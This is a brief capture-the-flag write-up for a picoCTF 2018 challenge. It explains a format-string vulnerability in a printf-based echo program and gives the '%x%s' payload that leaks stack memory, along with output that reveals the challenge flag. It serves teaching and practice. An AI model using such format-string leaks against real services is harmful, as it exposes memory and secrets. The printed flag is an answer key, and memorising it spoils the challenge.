[Category:Picoctf](/Category:Picoctf "wikilink") This program prints any
input you give it. Can you leak the flag? Connect with nc
2018shell.picoctf.com 3981. Source.

the vulnerability is that if you can put arbitrary string in a printf
function we can manipulate it into printing memory addresses with %x and
values at memory addresses with %s this combined is very bad :)

because it follows the stack we just have to put in the right amount of
%x%s which is 4

`> %x%s %x%s %x%s %x%s `
`40� �����  ��� p�� p�� p�� p�� p�� p�   8048  fff942a4picoCTF{foRm4t_stRinGs_aRe_DanGer0us_36de83c4} `
`>`